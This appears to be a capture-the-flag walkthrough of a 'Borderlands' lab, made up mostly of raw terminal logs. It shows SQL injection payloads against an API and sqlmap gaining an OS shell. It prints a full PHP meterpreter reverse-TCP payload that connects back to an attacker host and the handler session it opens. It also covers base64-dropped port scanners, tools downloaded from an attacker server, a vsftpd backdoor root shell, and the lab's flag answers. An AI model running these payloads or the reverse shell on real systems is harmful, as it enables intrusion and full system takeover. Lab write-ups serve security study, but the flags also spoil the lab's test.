:~/Borderlands# curl -s 'http:///xx.xxx.xx.xx/api.php? apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1 AND 1278=1278'
Document ID: 1<br />Document Name: Context_Red_Teaming_Guide.pdf<br />Document Location: Context_Red_Teaming_Guide.pdf<br />
```

```bash
:~/Borderlands# curl -s 'http:///xx.xxx.xx.xx/api.php?apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1 AND (SELECT 8449 FROM(SELECT COUNT(*),CONCAT(0x7178626b71,(SELECT (ELT(8449=8449,1))),0x7171627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)'
Duplicate entry 'qxbkq1qqbqq1' for key '<group_key>
```

```bash
:~/Borderlands# curl -s 'http:///xx.xxx.xx.xx/api.php?apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1 AND (SELECT 6817 FROM (SELECT(SLEEP(5)))KnNM)'
Document ID: 1<br />Document Name: Context_Red_Teaming_Guide.pdf<br />Document Location: Context_Red_Teaming_Guide.pdf<br />
```


```bash
:~/Borderlands# curl -s 'http:///xx.xxx.xx.xx/api.php?apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=1 AND (SELECT 6817 FROM (SELECT(SLEEP(5)))KnNM)'
Document ID: 1<br />Document Name: Context_Red_Teaming_Guide.pdf<br />Document Location: Context_Red_Teaming_Guide.pdf<br />
```


```bash
:~/Borderlands# curl -s 'http:///xx.xxx.xx.xx/api.php?apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD&documentid=-2023 UNION ALL SELECT CONCAT(0x7178626b71,0x587a574543766d6e55636f7341664959665072586a674c77546c446f4159734348436f776a416d48,0x7171627171),NULL,NULL-- -'
Document ID: qxbkqXzWECvmnUcosAfIYfPrXjgLwTlDoAYsCHCowjAmHqqbqq<br />Document Name: <br />Document Location: <br />
```


<h2>/index.php</h2>
<p>

- billg : potato</p>

<img width="1126" height="554" alt="image" src="https://github.com/user-attachments/assets/8f510bdd-4c9c-4b95-88b3-3c283730756c" />

<br>
<br>

<img width="1128" height="273" alt="image" src="https://github.com/user-attachments/assets/8d5f243f-99ff-4481-81d3-76dfea6d5b5e" />

<br>
<br>
<h2>/info.php</h2>

<img width="1128" height="303" alt="image" src="https://github.com/user-attachments/assets/72e737fd-3a39-4a9a-97e7-c53ca0b87349" />

<br>
<br>

<p>

- HTTP HOST = 10.201.65.90<br>
- SERVER NAME = 127.0.0.1<br>
- SERVER PORT = 80<br>
- SERVER ADDR = 172.18.0.2<br>
- REMOTE PORT = 34892<br>
- REMOTE ADDR = 10.201.71.77<br>
- SERVER SOFTWARE = nginx/1.14.0<br>
- DOCUMENTO ROOT = /var/www/html
</p>

<img width="1132" height="714" alt="image" src="https://github.com/user-attachments/assets/4a0a3d74-0924-4f58-9f64-bec2002a1b8e" />

<br>
<br>

```bash
:~/Borderlands# sqlmap -r request.txt -D myfirstwebsite --os-shell
...
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
...
which web application language does the web server support?
[1] ASP
[2] ASPX
[3] JSP
[4] PHP (default)
> 4
do you want sqlmap to further try to provoke the full path disclosure? [Y/n] Y
...
what do you want to use for writable directory?
[1] common location(s) ('/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs') (default)
[2] custom location(s)
[3] custom directory list file
[4] brute force search
> 4
...
use any additional custom directories [Enter for None]: /var/www
...
os-shell> ls -lah /var/www
do you want to retrieve the command standard output? [Y/n/a] Y
command standard output:
---
total 16K
drwxr-xr-x 1 root     root     4.0K Oct 11  2019 .
drwxr-xr-x 1 root     root     4.0K Oct  8  2019 ..
-rw-rw-r-- 1 www-data www-data   47 Sep 18  2019 flag.txt
drwxrwxrwx 1 root     root     4.0K Aug 31 16:44 html
---
os-shell> cat flag.txt
do you want to retrieve the command standard output? [Y/n/a] Y
command standard output: 'cat: flag.txt: No such file or directory'
os-shell> cat /var/www/flag.txt
do you want to retrieve the command standard output? [Y/n/a] Y
command standard output: '{FLAG:Webapp:48a5f4bfef44c8e9b34b926051ad35a6}'
os-shell> 
os-shell> ls -lah /var/www/html
do you want to retrieve the command standard output? [Y/n/a] Y
command standard output:
---
total 6.4M
drwxrwxrwx 1 root     root      4.0K Aug 31 16:44 .
drwxr-xr-x 1 root     root      4.0K Oct 11  2019 ..
drwxr-xr-x 8 root     root      4.0K Sep 18  2019 .git
-r--r----- 1 www-data www-data  522K Sep  6  2019 CTX_WSUSpect_White_Paper.pdf
-r--r----- 1 www-data www-data  803K Sep  6  2019 Context_Red_Teaming_Guide.pdf
-r--r----- 1 www-data www-data   57K Sep  6  2019 Context_White_Paper_Pen_Test_101.pdf
-r--r----- 1 www-data www-data  1.9M Sep  6  2019 Demystifying_the_Exploit_Kit_-_Context_White_Paper.pdf
-r--r----- 1 www-data www-data 1001K Sep  6  2019 Glibc_Adventures-The_Forgotten_Chunks.pdf
-r--r----- 1 www-data www-data   880 Sep 10  2019 api.php
-r--r----- 1 www-data www-data   18K Sep 10  2019 functions.php
-r--r----- 1 www-data www-data  1.5K Sep  9  2019 home.php
-r--r----- 1 www-data www-data   253 Sep 10  2019 index.php
-r--r----- 1 www-data www-data    21 Sep  6  2019 info.php
-r--r----- 1 www-data www-data  2.2M Sep 18  2019 mobile-app-prototype.apk
-rwxr-xr-x 1 www-data www-data   866 Aug 31 16:44 tmpbuhui.php
-rw-rw-rw- 1 mysql    mysql      766 Aug 31 16:44 tmpudatp.php
---
os-shell> 
```

<img width="1263" height="759" alt="image" src="https://github.com/user-attachments/assets/40f7ce84-2939-4f7b-960b-2ba62790438b" />


<h2 align="center">/root/ within Router1<a id='6'></a></h2>
<br>
<p> 1.5. What is the flag in the /root/ directory of router1? {FLAG:Router1:XXX}<em> Hint : use python to portscan</em><br>
<code>{FLAG:Router1:c877f00ce2b886446395150589166dcd}</code></p>
<br>



_______________________

<p>Navigated to http://http://10.201.90.105/tmpudatp.php</p>

<img width="1124" height="101" alt="image" src="https://github.com/user-attachments/assets/a273af44-fc86-4304-af6b-c162fe751ecc" />









<h2 align="center">Transmission from server to client over UDP<a id='7'></a></h2>
<br>
<p> 1.6. What flag is transmitted from flag_server to flag_client over UDP? {FLAG:UDP:XXX}em> Hint : use python to portscan</em><br>
<code>{FLAG:UDP:3bb271d020df6cbe599a46d20e9fcb3c}</code></p>
<br>

<h2 align="center">Transmission from server to client over TCP<a id='8'></a></h2>
<br>
<p> 1.7. What flag is transmitted from flag_server to flag_client over TCP? {FLAG:TCP:XXX}em> Hint : use python to portscan</em><br>
<code>{FLAG:TCP:8fb04648d6b2bd40af6581942fcf483e}</code></p>
<br>

<img width="1129" height="140" alt="image" src="https://github.com/user-attachments/assets/e28caee7-df5a-4072-9f02-259d27a0ac47" />

<h3 align="center">msfvenom</h3>

```bash
:~/Borderlands# msfvenom -p php/meterpreter/reverse_tcp lhost=XX.XXX.XXX.XX lport=4444 -f raw
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1113 bytes
/*<?php /**/ error_reporting(0); $ip = 'XX.XXX.XXX.XX'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
```

<img width="1258" height="217" alt="image" src="https://github.com/user-attachments/assets/65b24586-e2d7-4fc7-8145-c6d0b00a9f85" />


<p align="center"><em>rev.php</em></p>

```bash
/*<?php /**/ error_reporting(0); $ip = 'xx.xxx.xxx.xx'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
```

<img width="1125" height="89" alt="image" src="https://github.com/user-attachments/assets/b4b11f45-ef28-4d94-8bc4-377a7c9a4563" />

<br>

<img width="1125" height="42" alt="image" src="https://github.com/user-attachments/assets/c0da1523-8673-4f6b-ae24-1ad00563d92b" />


<p align="center">Navigated to http://TargetIP/rev.php</p>

```bash
msf6 >  use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > set lhost xx.xxx.xx.xxx
lhost => xx.xxx.xx.xxx
msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > exploit
[*] Started reverse TCP handler on xx.xxx.xx.xxx:4444 
[*] Sending stage (40004 bytes) to 10.10.143.3
[*] Meterpreter session 1 opened (10.10.195.74:4444 -> 10.10.143.3:45618) at 2025-07-21 00:53:03 +0100

meterpreter >
```

<img width="1254" height="326" alt="image" src="https://github.com/user-attachments/assets/edb6f9d8-0241-4bad-ab29-73673a067119" />

 
 
```bash
meterpreter > shell
Process 494 created.
Channel 0 created.
whoami
www-data
```

```bash
pwd
/var/www/html
```

```bash
getent hosts
127.0.0.1       localhost
127.0.0.1       localhost ip6-localhost ip6-loopback
172.18.0.2      app.ctx.ctf app
172.16.1.10     app.ctx.ctf app
```

```bash
ss
NetidState      Recv-Q Send-Q               Local Address:Port     Peer Address:Port                                                                            
u_strESTAB      0      0                                * 24432               * 24433                                                                           
u_strESTAB      0      0                                * 24433               * 24432                                                                           
u_strESTAB      0      0                                * 24576               * 24575                                                                           
u_strESTAB      0      0                                * 24575               * 24576                                                                           
u_strESTAB      8      0         /run/php/php7.2-fpm.sock 29202               * 0                                                                               
tcp  ESTAB      0      0                       172.18.0.2:60066   xx.xxx.xx.xxx:4444                                                                            
tcp  FIN-WAIT-2 0      0                       172.18.0.2:http    xx.xxx.xx.xxx:41880
```

```bash
which python3
/usr/bin/python3
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
www-data@app:~/html$ ip -s neigh
ip -s neigh
172.18.0.1 dev eth0 lladdr 02:42:10:d2:44:9e ref 1 used 33/0/28 probes 1 REACHABLE
```

<p align="center"><em>scan1.py</em></p>

```bash
www-data@app:~/html$ echo 'aW1wb3J0IHNvY2tldA0KDQpmb3IgaSBpbiByYW5nZSgwLCAyNTYpOg0KICAgIHNvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pDQogICAgc29jay5zZXR0aW1lb3V0KDAuNSkNCiAgICBpcCA9ICcxNzIuMTguMC57fScuZm9ybWF0KGkpDQogICAgaWYgMCA9PSBzb2NrLmNvbm5lY3RfZXgoKGlwLCAyMikpOg0KICAgICAgICBzb2NrLmNsb3NlKCkNCiAgICAgICAgcHJpbnQoaXAgKyAnICAgT04nICwgZmx1c2g9VHJ1ZSkNCiAgICBlbHNlOg0KICAgICAgICBwcmludChpcCwgIGZsdXNoPVRydWUpDQo=' | base64 -d > scan1.py
<udChpcCwgIGZsdXNoPVRydWUpDQo=' | base64 -d > scan1.py
```

<img width="1092" height="179" alt="image" src="https://github.com/user-attachments/assets/e1db6afd-c70a-4ce0-b3f7-25c9dfa30e0d" />

<br>
<br>
<p>

- 172.18.0.1</p>

```bash
www-data@app:/tmp$
 python3 arp.py
python3 arp.py
172.18.0.0
172.18.0.1   ON
172.18.0.2
172.18.0.3
172.18.0.4
...
```


```bash
www-data@app:/tmp$ echo 'IyEvdXNyL2Jpbi9weXRob24zDQppbXBvcnQgc29ja2V0DQppbXBvcnQgc2VsZWN0DQpkZWYgc2NhbihpcCk6DQogIHByaW50KCdcbj09ICcgKyBpcCkNCiAgdHJ5Og0KICAgIGZvciBwb3J0IGluIHJhbmdlKDEsNjU1MzUpOiAgDQogICAgICBzb2NrID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQ0KICAgICAgc29jay5zZXR0aW1lb3V0KDAuMikNCiAgICAgIHJlc3VsdCA9IHNvY2suY29ubmVjdF9leCgoaXAsIHBvcnQpKQ0KICAgICAgaWYgcmVzdWx0ID09IDA6DQogICAgICAgIHNvY2suc2V0YmxvY2tpbmcoMCkNCiAgICAgICAgcmVhZHkgPSBzZWxlY3Quc2VsZWN0KFtzb2NrXSwgW10sIFtdLCAwLjUpDQogICAgICAgIGlmIHJlYWR5WzBdOg0KICAgICAgICAgIGRhdGEgPSBzb2NrLnJlY3YoNDA5NikNCiAgICAgICAgcHJpbnQoIlBvcnQge306ICAgICAgT3BlblxuICB7fSIuZm9ybWF0KHBvcnQsIGRhdGEpKQ0KICAgICAgICBzb2NrLmNsb3NlKCkNCiAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0Og0KICAgIHN5cy5leGl0KCkNCiAgZXhjZXB0IHNvY2tldC5nYWllcnJvcjoNCiAgICBwcmludCgnSG9zdG5hbWUgY291bGQgbm90IGJlIHJlc29sdmVkLicpDQogICAgcmV0dXJuDQogIGV4Y2VwdCBzb2NrZXQuZXJyb3I6DQogICAgcHJpbnQoIkNvdWxkbid0IGNvbm5lY3QgdG8gc2VydmVyLiIpDQogICAgcmV0dXJuDQpzY2FuKCcxNzIuMTguMC4xJyk=' | base64 -d > ports1.py
```

```bash
www-data@app:/tmp$ ls
ls
scan1.py	ports1.py
```

<p>

- 22
- 80</p>

```bash
www-data@app:/tmp$ python3 ports1.py
python3 ports1.py

== 172.18.0.1
Port 22:      Open
  b'SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8\r\n'
Port 80:      Open
  b'SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8\r\n'
python3 ports1.py
```

<p>

- 172.18.0.1</p>


```bash
echo 'aW1wb3J0IHNvY2tldA0KDQpmb3IgaSBpbiByYW5nZSgwLCAyNTYpOg0KICAgIHNvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pDQogICAgc29jay5zZXR0aW1lb3V0KDAuNSkNCiAgICBpcCA9ICcxNzIuMTYuMS57fScuZm9ybWF0KGkpDQogICAgaWYgMCA9PSBzb2NrLmNvbm5lY3RfZXgoKGlwLCAyMikpOg0KICAgICAgICBzb2NrLmNsb3NlKCkNCiAgICAgICAgcHJpbnQoaXAgKyAnICAgT04nICwgZmx1c2g9VHJ1ZSkNCiAgICBlbHNlOg0KICAgICAgICBwcmludChpcCwgIGZsdXNoPVRydWUp' | base64 -d > scan2.py
```

<br>
<br>

```bash
www-data@app:~/html$ chmod +x netcat 
www-data@app:~/html$ ./netcat 172.16.1.128 21
220 (vsFTPd 2.3.4)
USER 123456:)
331 Please specify the password.
PASS 123456
```

```bash
:~/Borderlands# stty raw -echo; fg
nc -nlvp 4444

www-data@app:~/html$ export TERM=xterm
www-data@app:~/html$ pwd
/var/www/html
```

```bash
www-data@app:~/html$ ls
CTX_WSUSpect_White_Paper.pdf
Context_Red_Teaming_Guide.pdf
Context_White_Paper_Pen_Test_101.pdf
Demystifying_the_Exploit_Kit_-_Context_White_Paper.pdf
Glibc_Adventures-The_Forgotten_Chunks.pdf
api.php
arp.py
functions.php
home.php
index.php
info.php
mobile-app-prototype.apk
netcat
rev.php
scan2.py
t.py
tmpbxmyl.php
tmpusntl.php
```

```bash
www-data@app:~/html$ ./netcat 172.16.1.128 6200
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
ls
bin
dev
etc
home
lib
media
mnt
opt
proc
root
run
sbin
srv
supervisord.log
supervisord.pid
sys
tmp
usr
var
cd /root
ls
flag.txt
vsftpd
cat flag.txt
{FLAG:Router1:c877f00ce2b886446395150589166dcd}
```


```bash
www-data@app:/etc$ cat mtab
cat mtab
overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/KVBCUFUX47UAB7644MIVUODG2P:/var/lib/docker/overlay2/l/DNNEDZMRFITSDUS6FGAVKZBC3C:/var/lib/docker/overlay2/l/LNYPZBCRBRYPBNFEL7WJXKSHGC:/var/lib/docker/overlay2/l/64NWWAJBZVNVDQXAC7B3QCSJIW:/var/lib/docker/overlay2/l/63GTLCTVONM6BB7C4QR2RPQN7S:/var/lib/docker/overlay2/l/XNFKVROYQCEJH2SVAOCSZPLF4R:/var/lib/docker/overlay2/l/5CN26PMZT7B5TB4MF5MRUKZ42S:/var/lib/docker/overlay2/l/HW5ANSFG3A3N7V4DFC4P6JDGWX:/var/lib/docker/overlay2/l/RX2J4X2T3G4FIUEQJ4H66MXSCG:/var/lib/docker/overlay2/l/Z4JYYRAIMVGGJIORTJNILRKRVO:/var/lib/docker/overlay2/l/L2BIMW2PVJ4TMNP4LLEAUSUCHP:/var/lib/docker/overlay2/l/TAMASXVYRB4LEVDEXVUTR7K5AA:/var/lib/docker/overlay2/l/U6CZBILSES3MSBYGFCWJU2UIII:/var/lib/docker/overlay2/l/7ICSISLE3ZKKN3SFW5FTMKDHXP:/var/lib/docker/overlay2/l/R3TPIJT7XTLI27UICJB3Q6EQIY:/var/lib/docker/overlay2/l/3X7QHVZDTEDWZ473EGB5KBR7IJ:/var/lib/docker/overlay2/l/M3RATIXHSSTEV4TKYNYYV4ML6S:/var/lib/docker/overlay2/l/L4GCHGRHD65QFB36ZAFYAQULQF:/var/lib/docker/overlay2/l/7KDP3P5IIXOXFMDSAEI3NLDTFK:/var/lib/docker/overlay2/l/SQZ5EFAFI3OSJVPRW55EPGID3H:/var/lib/docker/overlay2/l/DDKNYPHBBEFSHZCPTRX4MONWJB:/var/lib/docker/overlay2/l/VCI5PVG4DCELY5IHMAGNQVRQ2M:/var/lib/docker/overlay2/l/O7OR5RLXVSEG7J7JJKEEG6VA26,upperdir=/var/lib/docker/overlay2/99fca206e6eac126b21b6df791a6878a151f0282becd805bf9f1885ed2c2ea03/diff,workdir=/var/lib/docker/overlay2/99fca206e6eac126b21b6df791a6878a151f0282becd805bf9f1885ed2c2ea03/work 0 0
proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
tmpfs /dev tmpfs rw,nosuid,size=65536k,mode=755 0 0
devpts /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666 0 0
sysfs /sys sysfs ro,nosuid,nodev,noexec,relatime 0 0
tmpfs /sys/fs/cgroup tmpfs ro,nosuid,nodev,noexec,relatime,mode=755 0 0
cgroup /sys/fs/cgroup/systemd cgroup ro,nosuid,nodev,noexec,relatime,xattr,release_agent=/lib/systemd/systemd-cgroups-agent,name=systemd 0 0
cgroup /sys/fs/cgroup/cpuset cgroup ro,nosuid,nodev,noexec,relatime,cpuset 0 0
cgroup /sys/fs/cgroup/pids cgroup ro,nosuid,nodev,noexec,relatime,pids 0 0
cgroup /sys/fs/cgroup/memory cgroup ro,nosuid,nodev,noexec,relatime,memory 0 0
cgroup /sys/fs/cgroup/freezer cgroup ro,nosuid,nodev,noexec,relatime,freezer 0 0
cgroup /sys/fs/cgroup/blkio cgroup ro,nosuid,nodev,noexec,relatime,blkio 0 0
cgroup /sys/fs/cgroup/cpu,cpuacct cgroup ro,nosuid,nodev,noexec,relatime,cpu,cpuacct 0 0
cgroup /sys/fs/cgroup/net_cls,net_prio cgroup ro,nosuid,nodev,noexec,relatime,net_cls,net_prio 0 0
cgroup /sys/fs/cgroup/hugetlb cgroup ro,nosuid,nodev,noexec,relatime,hugetlb 0 0
cgroup /sys/fs/cgroup/perf_event cgroup ro,nosuid,nodev,noexec,relatime,perf_event 0 0
cgroup /sys/fs/cgroup/devices cgroup ro,nosuid,nodev,noexec,relatime,devices 0 0
mqueue /dev/mqueue mqueue rw,nosuid,nodev,noexec,relatime 0 0
/dev/xvda1 /etc/resolv.conf ext4 rw,relatime,discard,data=ordered 0 0
/dev/xvda1 /etc/hostname ext4 rw,relatime,discard,data=ordered 0 0
/dev/xvda1 /etc/hosts ext4 rw,relatime,discard,data=ordered 0 0
shm /dev/shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k 0 0
/dev/xvda1 /var/www/flag.txt ext4 rw,relatime,discard,data=ordered 0 0
proc /proc/bus proc ro,relatime 0 0
proc /proc/fs proc ro,relatime 0 0
proc /proc/irq proc ro,relatime 0 0
proc /proc/sys proc ro,relatime 0 0
proc /proc/sysrq-trigger proc ro,relatime 0 0
tmpfs /proc/acpi tmpfs ro,relatime 0 0
tmpfs /proc/kcore tmpfs rw,nosuid,size=65536k,mode=755 0 0
tmpfs /proc/keys tmpfs rw,nosuid,size=65536k,mode=755 0 0
tmpfs /proc/timer_list tmpfs rw,nosuid,size=65536k,mode=755 0 0
tmpfs /proc/timer_stats tmpfs rw,nosuid,size=65536k,mode=755 0 0
tmpfs /proc/sched_debug tmpfs rw,nosuid,size=65536k,mode=755 0 0
tmpfs /proc/scsi tmpfs ro,relatime 0 0
tmpfs /sys/firmware tmpfs ro,relatime 0 0
```

```bash
www-data@app:/$ ls -lah
ls -lah
total 72K
drwxr-xr-x   1 root root 4.0K Oct 11  2019 .
drwxr-xr-x   1 root root 4.0K Oct 11  2019 ..
-rwxr-xr-x   1 root root    0 Oct 11  2019 .dockerenv
drwxr-xr-x   1 root root 4.0K Oct  8  2019 bin
drwxr-xr-x   2 root root 4.0K Apr 24  2018 boot
drwxr-xr-x   5 root root  340 Aug 31 16:27 dev
drwxr-xr-x   1 root root 4.0K Oct 11  2019 etc
drwxr-xr-x   2 root root 4.0K Apr 24  2018 home
drwxr-xr-x   1 root root 4.0K May 23  2017 lib
drwxr-xr-x   2 root root 4.0K Sep 12  2019 lib64
drwxr-xr-x   2 root root 4.0K Sep 12  2019 media
drwxr-xr-x   2 root root 4.0K Sep 12  2019 mnt
drwxr-xr-x   2 root root 4.0K Sep 12  2019 opt
dr-xr-xr-x 189 root root    0 Aug 31 16:27 proc
drwx------   2 root root 4.0K Sep 12  2019 root
drwxr-xr-x   1 root root 4.0K Oct 11  2019 run
drwxr-xr-x   1 root root 4.0K Oct  8  2019 sbin
drwxr-xr-x   2 root root 4.0K Sep 12  2019 srv
dr-xr-xr-x  13 root root    0 Aug 31 16:27 sys
drwxrwxrwt   1 root root 4.0K Aug 31 19:12 tmp
drwxr-xr-x   1 root root 4.0K Sep 12  2019 usr
drwxr-xr-x   1 root root 4.0K Oct  8  2019 var
```

```bash
www-data@app:/$ ps -Af
ps -Af
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 16:27 ?        00:00:00 /bin/bash /sbin/entrypoint.sh
mysql       41     1  0 16:27 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
mysql      407    41  0 16:27 ?        00:00:03 /usr/sbin/mysqld --basedir=/usr 
root       480     1  0 16:27 ?        00:00:00 php-fpm: master process (/etc/ph
www-data   481   480  0 16:27 ?        00:00:00 php-fpm: pool www
www-data   482   480  0 16:27 ?        00:00:00 php-fpm: pool www
root       483     1  0 16:27 ?        00:00:00 nginx: master process nginx -g d
www-data   484   483  0 16:27 ?        00:00:00 nginx: worker process
www-data   494   482  0 17:03 ?        00:00:00 [sh] <defunct>
www-data   529   482  0 17:25 ?        00:00:00 [sh] <defunct>
www-data   539   482  0 17:30 ?        00:00:00 [sh] <defunct>
www-data   540     1  0 17:30 ?        00:00:00 /bin/sh
www-data   541   540  0 17:30 ?        00:00:00 python3 -c import pty; pty.spawn
www-data   542   541  0 17:30 pts/2    00:00:00 /bin/bash
www-data   556   482  0 17:40 ?        00:00:00 [sh] <defunct>
www-data   557     1  0 17:40 ?        00:00:00 /bin/sh
www-data   558   557  0 17:41 ?        00:00:00 python3 -c import pty; pty.spawn
www-data   559   558  0 17:41 pts/3    00:00:00 /bin/bash
www-data   570   482  0 17:44 ?        00:00:00 [sh] <defunct>
www-data   571     1  0 17:44 ?        00:00:00 /bin/sh
www-data   572   571  0 17:44 ?        00:00:00 python3 -c import pty; pty.spawn
www-data   573   572  0 17:44 pts/4    00:00:00 /bin/bash
www-data   591   482  0 18:07 ?        00:00:00 [sh] <defunct>
www-data   592     1  0 18:07 ?        00:00:00 /bin/sh
www-data   614   592  0 18:16 ?        00:00:00 python3 -c import pty; pty.spawn
www-data   615   614  0 18:16 pts/0    00:00:00 /bin/bash
www-data   642   615  0 18:32 pts/0    00:00:26 ./nmap -sn -T5 172.18.0.0/16
www-data   643   482  0 18:34 ?        00:00:00 [sh] <defunct>
www-data   644     1  0 18:34 ?        00:00:00 /bin/sh
www-data   645   644  0 18:34 ?        00:00:00 python3 -c import pty;pty.spawn(
www-data   646   645  0 18:34 pts/1    00:00:00 /bin/bash
www-data   656   482  0 18:46 ?        00:00:00 [sh] <defunct>
www-data   657     1  0 18:46 ?        00:00:00 /bin/sh
www-data   658   657  0 18:46 ?        00:00:00 python3 -c import pty;pty.spawn(
www-data   659   658  0 18:46 pts/5    00:00:00 /bin/bash
www-data   665   482  0 19:00 ?        00:00:00 [sh] <defunct>
www-data   666     1  0 19:00 ?        00:00:00 /bin/sh
www-data   667   666  0 19:00 ?        00:00:00 python3 -c import pty;pty.spawn(
www-data   668   667  0 19:00 pts/6    00:00:00 /bin/bash
www-data   730   668  0 19:17 pts/6    00:00:00 ./netcat 172.16.1.128 179
www-data   731   482  0 19:18 ?        00:00:00 sh -c /bin/sh 
www-data   732   731  0 19:18 ?        00:00:00 /bin/sh
www-data   733   732  0 19:19 ?        00:00:00 python3 -c import pty; pty.spawn
www-data   734   733  0 19:19 pts/7    00:00:00 /bin/bash
www-data   756   734  0 19:29 pts/7    00:00:00 ps -Af
```

```bash
ps -eo pid,cmd
  PID CMD
    1 /bin/bash /sbin/entrypoint.sh
   41 /bin/sh /usr/bin/mysqld_safe
  407 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr
  480 php-fpm: master process (/etc/php/7.2/fpm/php-fpm.conf)
  481 php-fpm: pool www
  482 php-fpm: pool www
  483 nginx: master process nginx -g daemon off;
  484 nginx: worker process
```

```bash
== 172.18.0.1
Port 21:      Open
  b'220 (vsFTPd 2.3.4)\r\n'
Port 179:      Open
  b''
Port 2601:      Open
...
Port 2605:      Open
...
```

```bash
:~/Borderlands# sqlmap -u '10.201.65.90/api.php?documentid=1&apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD' --risk 2 --level 5 --threads 10 --batch --dbs --os-shell
```

<img width="1092" height="461" alt="image" src="https://github.com/user-attachments/assets/bc97a6d8-d975-4f74-9a3d-b0223368d7bd" />

<br>
<br>

<h2>tmpusntl.php>/h2>

<img width="1224" height="216" alt="image" src="https://github.com/user-attachments/assets/430c48d3-b2ba-4f98-88d7-5145f6f7d62c" />


<br>
<br>

```bash
/api.php?apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD
```


```bash
import urllib.request

url= "http://10.201.76.116:8000/chisel"
urllib.request.urlretrieve(url, "chisel")
```

<img width="1129" height="148" alt="image" src="https://github.com/user-attachments/assets/725533fa-d91d-4cac-940f-d5821044453d" />

<br>
<br>

```bash
www-data@app:~/html$ python3 d.py
python3 d.py
```

```bash
:~/Borderlands# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.201.90.105 - - [31/Aug/2025 19:24:24] "GET /chisel HTTP/1.1" 200 -
```

```bash
import urllib.request

url= "http://10.201.76.116:8000/nmap-x64.tar.gz"
urllib.request.urlretrieve(url, "nmap.tar.gz")
```

```bash
www-data@app:~/html$ python3 n.py
python3 n.py
```


```bash
:~/Borderlands# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.201.90.105 - - [31/Aug/2025 19:26:46] "GET /nmap-x64.tar.gz HTTP/1.1" 200 -
```

```bash
www-data@app:~/html$ tar -xf nmap.tar.gz
```

```bash
./nmap 172.18.0.0/24
...
